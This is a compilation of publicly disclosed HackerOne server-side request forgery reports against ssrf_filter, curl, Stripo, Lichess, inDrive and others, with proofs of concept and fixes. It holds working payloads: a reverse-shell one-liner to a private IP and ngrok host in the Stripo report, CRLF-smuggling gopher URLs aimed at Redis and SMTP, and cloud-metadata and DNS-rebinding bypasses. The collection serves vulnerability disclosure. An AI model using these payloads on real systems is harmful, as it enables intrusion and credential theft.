# Server-Side Request Forgery (SSRF)

_93 reports — High/Critical, disclosed_

### [SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)](https://hackerone.com/reports/3634400)

- **Report ID:** `3634400`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** arkadiyt-projects
- **Reporter:** @tipsen
- **Bounty:** - usd
- **Disclosed:** 2026-03-31T02:31:50.435Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
`ssrf_filter` v1.3.0 blocks `64:ff9b::/96`, but doesnt block the NAT64 local-use prefix `64:ff9b:1::/48`, allowing those addresses to be treated as public. This enables SSRF requests through `/fetch` to internal-equivalent targets encoded under that prefix when routable in the deployment environment.

## Steps To Reproduce:
1. Like previous report, start our lab first :) (I'm using the library in Docker)
2. Start a second app container with `NET_ADMIN` so we can add a test IPv6 route/address.
```bash
TIPSEN:~:% NET=$(docker inspect ssrf_filter_lab --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')
TIPSEN:~:% docker rm -f ssrf_filter_lab_netadmin 2>/dev/null || true
ssrf_filter_lab_netadmin
TIPSEN:~:% docker run -d --name ssrf_filter_lab_netadmin --network "$NET" --cap-add NET_ADMIN -p 4568:4567 bbp-ssrf-ssrf-app ruby app.rb
46929c09894e83249c8143c192a727f2583b116c2be0ce70e1528773fb3b388f
```

3. Install `iproute2` in that container and add NAT64 local-use address `64:ff9b:1::7f00:1` to loopback.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'apt-get update -qq && apt-get install -y -qq iproute2 && ip -6 addr add 64:ff9b:1::7f00:1/128 dev lo || true && ip -6 addr show dev lo'
...
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet6 64:ff9b:1::7f00:1/128 scope global
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
```

4. Start a local HTTP service bound to that NAT64 local-use address.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'cat > /tmp/vuln_server_nat64.rb << "RUBY"
require "socket"
server = TCPServer.new("64:ff9b:1::7f00:1", 18081)
loop do
  sock = server.accept
  begin
    while (line = sock.gets)
      break if line == "\r\n"
    end
    body = "NAT64_PREFIX_BYPASS_DEMO"
    sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}")
  ensure
    sock.close rescue nil
  end
end
RUBY
nohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'
```

5. Verify the service is reachable on that address from inside the same container.
```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'ruby -rsocket -e "s=TCPSocket.new(\"64:ff9b:1::7f00:1\",18081); s.write(\"GET / HTTP/1.0\r\nHost: x\r\n\r\n\"); puts s.read; s.close"'
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 24
Connection: close

NAT64_PREFIX_BYPASS_DEMO
```

6. Control check: known blocked NAT64 well-known prefix.
```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}%
```

7.  Bypass check: unblocked NAT64 local-use prefix.
```bash
TIPSEN:~:% curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}%
```

## Supporting Material/References:
Gonna put the root cause here to make checking easier :)
1. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L47-L59: `IPV6_BLACKLIST` includes `64:ff9b::/96` but doesn't include `64:ff9b:1::/48` (NAT64 local-use prefix), leaving that range unclassified as private/unsafe.
2. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L139-L143: `unsafe_ip_address?` decides IPv6 safety only by membership in `IPV6_BLACKLIST`. Because `64:ff9b:1::/48` is missing, those addresses are treated as safe/public.
3. https://github.com/arkadiyt/ssrf_filter/blob/main/lib/ssrf_filter/ssrf_filter.rb#L126-L127: The resolver output is filtered with `unsafe_ip_address?` and unblocked NAT64 local-use addresses remain in `public_addresses`, so the private-IP guard is bypassed.

## Impact

An attacker can bypass SSRF protections and force server-side requests to restricted/internal destinations using `64:ff9b:1::/48` addresses. This may expose sensitive internal services or metadata and can enable additional internal network reconnaissance or pivoting.

---

### [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785)

- **Report ID:** `3508785`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** curl
- **Reporter:** @andrew-bbp
- **Bounty:** - usd
- **Disclosed:** 2026-01-14T09:32:16.666Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The `curl` Gopher protocol handler is vulnerable to command injection through URL-encoded CRLF sequences in the path. This allows an attacker to "smuggle" additional Gopher selectors or arbitrary commands into a single Gopher request. By using `%0d%0a` in the URL, an attacker can break the line-delimited Gopher protocol and force `curl` to send multiple distinct request lines to the server.

## Affected Component
- **File:** `lib/gopher.c`
- **Function:** `gopher_do`
- **Line:** 101
- **Vulnerable Code:** `Curl_urldecode` call with `REJECT_ZERO` flag

## Vulnerability Details

### Root Cause
In `lib/gopher.c`, the Gopher protocol handler extracts the selector from the URL and decodes it using `Curl_urldecode` with the `REJECT_ZERO` flag:

```c
/* lib/gopher.c:101 */
result = Curl_urldecode(newp, 0, &buf_alloc, &buf_len, REJECT_ZERO);
```

The `REJECT_ZERO` flag only prevents null bytes (`%00`) from being decoded. All other control characters, including:
- Carriage Return (`%0d` / `\r`)
- Line Feed (`%0a` / `\n`)

are decoded into the raw buffer `buf_alloc` and subsequently sent to the server.

### Attack Mechanism
The Gopher protocol is line-delimited. After decoding the selector, `curl` sends it to the server followed by a hardcoded CRLF:

```c
/* lib/gopher.c:110 */
result = Curl_xfer_send(data, buf, buf_len, FALSE, &nwritten);
...
/* lib/gopher.c:156 */
result = Curl_xfer_send(data, "\r\n", 2, FALSE, &nwritten);
```

If an attacker provides a URL like:
```
gopher://example.com/1/selector%0d%0aINJECTED_COMMAND
```

The resulting network transmission will be:
```
selector\r\n
INJECTED_COMMAND\r\n
```

A standard Gopher server processes each line independently, so it will see:
1. A request for `selector`
2. A second, attacker-controlled request for `INJECTED_COMMAND`

## Proof of Concept

### Step 1: Start a Listener
Open a terminal and start a netcat listener to observe the raw protocol traffic:

```bash
nc -l -p 7070
```

### Step 2: Execute the Attack
In another terminal, run curl with the malicious Gopher URL:

```bash
curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"
```

### Step 3: Observe the Result
In the netcat listener terminal, you will see two distinct lines:

```
first-command
second-command
```

This proves that the attacker can inject arbitrary commands into the Gopher protocol stream.

### Alternative PoC (Python)
You can also use this Python script to verify:

```python
import socket

# Start a simple Gopher server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', 7070))
s.listen(1)
print("Gopher server listening on port 7070...")

conn, addr = s.accept()
data = conn.recv(1024).decode()
print("=== Received Data ===")
print(repr(data))
print("\n=== Parsed Lines ===")
for line in data.split('\r\n'):
    if line:
        print(f"Command: {line}")
conn.close()
s.close()
```

Run this script, then execute:
```bash
curl "gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious"
```

Expected output:
```
=== Received Data ===
'legitimate\r\ninjected\r\nmalicious\r\n'

=== Parsed Lines ===
Command: legitimate
Command: injected
Command: malicious
```

## Impact

### SSRF Enhancement
This vulnerability significantly enhances Server-Side Request Forgery (SSRF) attacks. If a web application allows users to provide a URL that is fetched by `curl`, an attacker can:

1. **Smuggle commands to internal Gopher servers**
   - Send multiple queries in a single request
   - Bypass rate limiting or logging mechanisms

2. **Communicate with other line-delimited internal services**
   - Redis (if accessible via Gopher port or through port confusion)
   - SMTP servers
   - Memcached
   - Custom internal protocols

3. **Bypass security controls**
   - WAFs that only inspect the URL path
   - Logging systems that record only the initial request

### Attack Scenarios

**Scenario 1: Redis Command Injection**
```
gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data
```

**Scenario 2: SMTP Relay**
```
gopher://mail-server:25/1/MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing
```

## Recommendation

### Fix
Update `lib/gopher.c` to use `REJECT_CTRL` or `REJECT_CTRL_ZERO` instead of `REJECT_ZERO` in the `Curl_urldecode` call:

```c
/* lib/gopher.c:101 - FIXED */
result = Curl_urldecode(newp, 0, &buf_alloc, &buf_len, REJECT_CTRL);
```

This will prevent the decoding of newlines and other control characters that can be used to manipulate the protocol stream.

### Verification
After applying the fix, the PoC should fail with an error indicating that control characters are not allowed in the URL.

---

### [[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier](https://hackerone.com/reports/2932960)

- **Report ID:** `2932960`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @odaysec
- **Bounty:** - usd
- **Disclosed:** 2025-12-01T08:22:34.107Z
- **CVE(s):** -

**Vulnerability Information:**

## Introduction Vulnerability Overview
This presentation covers a critical Blind SSRF (Server-Side Request Forgery) vulnerability identified in Stripo's export service. SSRF vulnerabilities allow attackers to manipulate a server to make arbitrary requests to internal or external systems, potentially leading to severe security breaches. The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`. By providing malicious input in the `webhookUrl` parameter, an attacker can trigger SSRF, allowing the server to make unauthorized HTTP requests to attacker-controlled systems.

## Exploitation Details

### Proof of Concept (PoC)
The following `curl` command demonstrates the vulnerability exploitation:
https://my.stripo.email/editor/v5/1529528/email/8891640
```bash
curl -i -X POST 'https://my.stripo.email/bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412' \
--data '{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}'
```
Resulting HTTP Request
When processed, the application generates the following HTTP request to the specified `webhookUrl`:
```
POST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1
Host: 5290-101-255-157-9.ngrok-free.app
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)
Content-Length: 104
Accept: application/json
Accept-Encoding: gzip,deflate
Traceparent: 00-58ae5f178436f516dfed5bcabe66e0a4-6f1c4d73cae918b9-00
X-Forwarded-For: 54.247.167.106
X-Forwarded-Host: 5290-101-255-157-9.ngrok-free.app
X-Forwarded-Proto: https
```
HTTP Request via Burp Suite
```
POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1
Host: my.stripo.email
Content-Type: application/json
Content-Length: 457

{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}
```
**Payload:**
```js
{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}
```
{F3939737}

## Impact

**Data Exfiltration**:
  - Attackers can leverage SSRF to access sensitive internal network data, such as cloud metadata, internal API endpoints, or other restricted services.  `port-scan`
  - Missing Endpoints Export Email Message to Zapier
  - Control character allowed in Export Email Message to Zapier
  - URL Not have filthered as `webhook/email.tar.gz`
  - Internal Resource Access: Blind SSRF allows accessing internal services or endpoints, bypassing network restrictions.
  - Chained Attacks: It could lead to advanced exploitation, such as retrieving sensitive metadata or executing remote commands.

---

### [DNS Rebinding Attack](https://hackerone.com/reports/3383095)

- **Report ID:** `3383095`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** arkadiyt-projects
- **Reporter:** @newby99
- **Bounty:** - usd
- **Disclosed:** 2025-10-19T21:33:19.700Z
- **CVE(s):** -

**Vulnerability Information:**

Hi, there is a  DNS rebinding vulnerability in your SSRF filter. 

{F4891755}

You validate the hostname's IP address, but then pass the hostname to Net::HTTP.start(), which does its own DNS lookup. An attacker can control a DNS server that returns a safe public IP during validation, then returns 127.0.0.1 when Net::HTTP resolves it shortly later...

```
::Net::HTTP.start(uri.hostname, uri.port, **http_options) do |http| # Currently using uri.hostname which triggers a new dns lookup!
```
Example POC: 
Attacker sets up evil.com DNS to alternate responses. First query (your validation) returns 8.8.8.8. Second query (Net::HTTP's internal lookup) returns 127.0.0.1. As a result: SsrfFilter.get('http://evil.com:6379') bypasses all protection and hits some internal service on localhost..

Suggested fix: 
Connect directly to the validated IP instead of the hostname. Change Net::HTTP.start(uri.hostname, ...) to Net::HTTP.start(validated_ip, ...) and set the Host header manually: headers['Host'] = uri.hostname. 
Also use ssl_hostname: uri.hostname for proper TLS certificate validation. This eliminates the race window entirely since DNS only resolves once during validation.

## Impact

The library validates DNS resolution but passes the hostname (not the validated IP) to Net::HTTP, which performs a second DNS lookup. Attacker's DNS server returns different IPs for each query

---

### [Server-Side Request Forgery (SSRF) via Game Export API](https://hackerone.com/reports/3165242)

- **Report ID:** `3165242`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Lichess
- **Reporter:** @oblivionsage
- **Bounty:** - usd
- **Disclosed:** 2025-06-03T12:56:00.368Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary

Hello Lichess Team,

I found a Server-Side Request Forgery vulnerability in the game export functionality. An attacker can make the Lichess server send HTTP requests to arbitrary URLs by manipulating the `players` parameter. This works on public endpoints that don't require any authentication





# Description:

The issue is in the game export API endpoints that accept a `players` parameter. When I looked at the code, I noticed that this parameter gets passed directly to `RealPlayerApi.apply()` without any URL validation


Here's the problematic flow I found:



In `app/controllers/Game.scala`:

```bash
val config = GameApiV2.OneConfig(
  format = GameApiV2.Format.byRequest,
  imported = getBool("imported"),
  flags = requestPgnFlags(extended = true),
  playerFile = get("players")  // User input taken directly
)
```


Then in `modules/api/src/main/GameApiV2.scala`:


```bash
realPlayers                  <- config.playerFile.so(realPlayerApi.apply)
```

And finally in `modules/web/src/main/RealPlayer.scala`

```bash
def apply(url: String): Fu[Option[RealPlayers]] = cache.get(url)
// This leads to:
ws.url(url).withRequestTimeout(3.seconds).get()
```


The `get("players")` method directly reads from HTTP query parameters without any validation. The `so()` method executes the function when the Option contains a value, so any URL I provide gets passed straight to the HTTP client




# PoC

Note: I discovered this vulnerability through source code analysis and then confirmed it by testing live on the official Lichess website. The following PoC demonstrates the issue as it exists in the production environment

1. Pick any valid game ID from Lichess (like from a recent game)

{F4390928}

2. Make a request to: `/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/ `

3. The server will make an HTTP request to the provided URL

4. You can also test with: `/api/games/export/_ids?players=[URL]` or `/api/games/user/[USERNAME]?players=[URL] `

5. Monitor your server logs or use a service like webhook.site to confirm the request


{F4390944}

{F4390945}

# Mitigation:

To fix this, you should:

+ Add URL validation to only allow specific trusted domains for the `players` parameter

+ Implement a whitelist of allowed URLs or URL patterns

+ Consider removing the feature entirely if it's not critical

+ Add authentication requirements for these endpoints

+ Block requests to private IP ranges (127.x.x.x, 192.168.x.x, 10.x.x.x, 169.254.x.x) (For security and ethical reasons, I did not send any actual requests to these IP addresses. If required, I can provide my own IP address or any additional information for verification purposes)


The fix should be in `RealPlayerApi.apply()` method to validate the URL before making any HTTP requests.


https://cwe.mitre.org/data/definitions/918.html

## Impact

An attacker could use this to:

+ Access cloud metadata services (AWS, GCP) to steal credentials and configuration
+ Scan internal networks and discover internal services
+ Access internal APIs and admin panels that aren't exposed to the internet
+ Potentially read sensitive internal data or configuration files
+ Perform port scanning of internal infrastructure

This is particularly concerning because the endpoints are public - no authentication needed. Also, since it's on a high-traffic site like Lichess, an attacker could potentially use this to bypass IP-based restrictions on internal services

---

### [SSRF in Autodesk Rendering leading to account takeover](https://hackerone.com/reports/3024673)

- **Report ID:** `3024673`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Autodesk
- **Reporter:** @metereorpreter
- **Bounty:** - usd
- **Disclosed:** 2025-03-18T18:48:21.248Z
- **CVE(s):** -

**Summary (team):**

A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in. Autodesk has fixed the vulnerability and we thank @metereorpreter for reporting this issue.

**Summary (researcher):**

SSRF enables 1-click account takeover / exposes AWS metadata

---

### [External service interaction (HTTP)](https://hackerone.com/reports/2731133)

- **Report ID:** `2731133`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** AWS VDP
- **Reporter:** @hesham_elsheme
- **Bounty:** - usd
- **Disclosed:** 2024-10-04T15:53:04.137Z
- **CVE(s):** -

**Vulnerability Information:**

There is External service interaction ( DNS and HTTP ) vulnerability in
url :  ████ in this video 
██████████

## Impact

The External Service Interaction arise when it is possible for a attacker to induce application to interact with the arbitrary external service such as DNS HTTP etc.
The External Service Interaction can is not limited to HTTP,HTTPS or DNS, you can lead to FTP, SMTP etc. Such weakness can lead to DDoS attack.
The External Service Interaction can lead to OS Command Injection, DOS Attack, DDOS Attack or Code Manipulation

**Summary (team):**

Thank you for bringing this issue to our attention. Upon review, we identified that the related infrastructure was previously deprecated, and it seems that this particular test resource was unintentionally overlooked during the process.

While the finding is outside the scope of the program (not related to AWS Software or Services), we appreciate the report and will proceed to close the report as resolved.

Thanks again for your report and for helping us protect our customers! Please feel free to reach out if you have any further questions or concerns.

---

### [SSRF and secret key disclosure found on Turbonomic endpoint](https://hackerone.com/reports/2697592)

- **Report ID:** `2697592`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** IBM
- **Reporter:** @mersa-v6
- **Bounty:** - usd
- **Disclosed:** 2024-09-19T17:58:56.246Z
- **CVE(s):** -

**Summary (team):**

SSRF and secret key disclosure found on Turbonomic endpoint were reported to IBM, analyzed and have been remediated. Thank you to our external researcher, mersa-v6.

---

### [SSRF and secret key disclosure found on Turbonomic endpoint](https://hackerone.com/reports/2697601)

- **Report ID:** `2697601`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** IBM
- **Reporter:** @mersa-v6
- **Bounty:** - usd
- **Disclosed:** 2024-09-19T17:49:42.561Z
- **CVE(s):** -

**Summary (team):**

SSRF and secret key disclosure found on Turbonomic endpoint were reported to IBM, analyzed and have been remediated. Thank you to our external researcher, mersa-v6.

---

### [Unauthenticated full-read SSRF via Twilio integration](https://hackerone.com/reports/1886954)

- **Report ID:** `1886954`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Rocket.Chat
- **Reporter:** @mokusou
- **Bounty:** - usd
- **Disclosed:** 2024-08-04T16:53:48.222Z
- **CVE(s):** CVE-2024-39713

**Summary (team):**

A Server-Side Request Forgery (SSRF) affects Rocket.Chat's Twilio webhook endpoint before version 6.10.1.

---

### [/applications/dpc_(get|post) provide full access to api.steampowered.com with the Dota2 API key](https://hackerone.com/reports/674800)

- **Report ID:** `674800`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:27:02.614Z
- **CVE(s):** -

**Summary (team):**

Insufficient validation of parameters enabled using path traversal to call arbitrary API methods using an API key that had elevated privileges for Dota2.

**Summary (researcher):**

.

---

### [important: Apache HTTP Server on WIndows UNC SSRF (CVE-2024-38472)](https://hackerone.com/reports/2585385)

- **Report ID:** `2585385`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Internet Bug Bounty
- **Reporter:** @orange
- **Bounty:** 4920 usd
- **Disclosed:** 2024-07-13T14:36:40.339Z
- **CVE(s):** CVE-2024-38472

**Vulnerability Information:**

I reported this vulnerability through the official Apache HTTP Server security email on April 1, 2024, and received a fix along with a CVE number on July 1, 2024. You can check detailed information from there:
> https://httpd.apache.org/security/vulnerabilities_24.html

## Impact

SSRF in Apache HTTP Server on Windows allows to potentially leak NTML hashes to a malicious server via SSRF and malicious requests or content

Users are recommended to upgrade to version 2.4.60 which fixes this issue. Note: Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.

**Summary (team):**

###important: Apache HTTP Server on WIndows UNC SSRF (CVE-2024-38472)

SSRF in Apache HTTP Server on Windows allows to potentially leak NTML hashes to a malicious server via SSRF and malicious requests or content

Users are recommended to upgrade to version 2.4.60 which fixes this issue. Note: Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.

Acknowledgements: finder: Orange Tsai (@orange_8361) from DEVCORE

Reported to security team:	2024-04-01
fixed by r1918558 in 2.4.x:	2024-07-01
Update 2.4.60 released:	2024-07-01
Affects: 2.4.0 through 2.4.59

---

### [Libuv: Improper Domain Lookup that potentially leads to SSRF attacks](https://hackerone.com/reports/2429894)

- **Report ID:** `2429894`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Internet Bug Bounty
- **Reporter:** @hunt1
- **Bounty:** 4860 usd
- **Disclosed:** 2024-03-29T22:54:22.421Z
- **CVE(s):** CVE-2024-24806

**Vulnerability Information:**

I recently encountered a challenge in a CTF competition that led me to discover a vulnerability within Node.js, present in all versions after v10. Upon further investigation and code debugging, it became apparent that the vulnerability originated from its direct dependency, `libuv`.

I submitted a report to the Node.js team via HackerOne, and they subsequently connected me with the libuv team. This collaboration resulted in the identification and resolution of the vulnerability, now recorded as CVE-2024-24806.

## Impact

This vulnerability could allow an attacker to craft payloads that results in **SSRF** attacks and **Internal API Access**. Full explanation of vulnerability, PoC and sample scenarios are provided within the original report:
https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6

**Summary (team):**

Improper Domain Lookup that potentially leads to SSRF attacks

Summary
The uv_getaddrinfo function in src/unix/getaddrinfo.c (and its windows counterpart src/win/getaddrinfo.c), truncates hostnames to 256 characters before calling getaddrinfo. This behavior can be exploited to create addresses like 0x00007f000001, which are considered valid by getaddrinfo and could allow an attacker to craft payloads that resolve to unintended IP addresses, bypassing developer checks.

Full GHSA: https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6

---

### [Lack of sanitization of the billing address in pdf invoice](https://hackerone.com/reports/2077985)

- **Report ID:** `2077985`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2024-03-06T12:20:11.202Z
- **CVE(s):** -

**Summary (team):**

Adam identified a vulnerability that allowed the HTML code injection into payment invoice PDFs. This vulnerability arose from insufficient content sanitization during the interaction between services, where considered trustworthy content from the user service was transferred to the invoice generation system without proper validation.
It's important to note that the PDF generation backend operates in isolation from the payment infrastructure. As a result, it does not have the capability to access sensitive information.
The subsequent internal review revealed no evidence of this vulnerability being exploited by unauthorized parties.

---

### [[SSRF] my.stripo.email via the setup-wizard parameter](https://hackerone.com/reports/1622432)

- **Report ID:** `1622432`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @deb0con
- **Bounty:** - usd
- **Disclosed:** 2024-02-15T10:44:12.341Z
- **CVE(s):** -

**Summary (team):**

Resolved

---

### [SSRF in https://couriers.indrive.com/api/file-storage](https://hackerone.com/reports/2300358)

- **Report ID:** `2300358`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** inDrive
- **Reporter:** @cypher-28
- **Bounty:** - usd
- **Disclosed:** 2024-01-16T17:11:29.622Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
SSRF in  ` url ` parameter in https://couriers.indrive.com/api/file-storage

## Steps To Reproduce:

I will try to demonstrate it using burp collaborator 

  1. Request https://couriers.indrive.com/api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com  ( replace ` url ` value with your burp collaporator )

  1. Notice the contnet being displayed in the response and also the Interaction in your burp collaborator

* The Request 
```
GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2
Host: couriers.indrive.com
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ar;q=0.8


```

* The Response 
```
HTTP/2 200 OK
Authorization: Bearer undefined
Content-Disposition: attachment; filename="file
Date: Sun, 31 Dec 2023 13:19:04 GMT
X-Envoy-Upstream-Service-Time: 678
Server: istio-envoy
X-Cache: Miss from cloudfront
Via: 1.1 33c6e91bdc193e34e8dcc80edc466018.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: MRS52-P2
X-Amz-Cf-Id: 9GuBZr1A03ZS0bEYUbDp80JZj8dNYCE4YoVUImLD5RU15dEM-vs5fQ==

<html><body>6zy5d1pwzab93qopx8jq2ezjigz</body></html>
```


## Supporting Material/References:

████
██████████
████████

## Note
If you request any website like for example ` www.google.com `,  ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response 

## Impact

The ` url ` parameter doesn't sanitize The input properly  which can make the Attacker to request any website he wants

**Summary (team):**

Subscribe to our telegram channel with updates https://t.me/indrive_bbp

---

### [Server Side Request Forgery (SSRF) via Analytics Reports](https://hackerone.com/reports/2262382)

- **Report ID:** `2262382`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** HackerOne
- **Reporter:** @hacker1_agent
- **Bounty:** - usd
- **Disclosed:** 2023-12-08T18:09:11.323Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability.


## Proof of concept

+ ███

## Impact

SSRF.

Thanks and have a nice day!

**Summary (team):**

We recently received a critical server-side request forgery (SSRF) vulnerability report through our bug bounty program. The issue allowed attackers to make internal requests from our application servers by exploiting a lack of output sanitization in an error message. By crafting malicious requests, an attacker could have accessed internal AWS services and obtained temporary credentials. 

Upon receiving the report, we were able to reproduce and verify the issue. We have implemented a fix that is now deployed in production. Below you can see that element[:template] wasn’t properly sanitized in the error message. The value being returned `html_without_layout` is being fed into a library that converts this into a PDF.

Diff: 

```ruby
             
html_without_layout = elements.map do |element|
  case element[:type]
  when 'template'
    path = template_path(element)
    if path
      ApplicationController.new.render_to_string(
        partial: path,
        layout: false,
        assigns: {
          include_css: true,
        },
        locals: {
          query_results:,
          constants: PSR_CONSTANTS,
          retesting_reports: retesting_reports,
          reporters: reporters,
          total_submission_count: total_submission_count,
          in_scope_asset_count: in_scope_asset_count,
          report_asset_count: report_asset_count,
        },
      )  
    else
-    "Missing template for element: #{element[:template]}"
+    "Missing template for element"

```

We have also added regression tests to prevent future occurrences of this vulnerability. 

Our forensic investigation concluded that there is no evidence this issue was exploited prior to the report.

We have rated this vulnerability CVSSv3 10 (Critical) based on the potential impact of exposed credentials: 

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/CR:H/IR:H/AR:H. 

We want to thank @mega7 for sending in their report; reports like this one are invaluable for us to continue enhancing our security posture. We also appreciate them for stopping at the right point in testing, demonstrating a responsible and ethical approach.

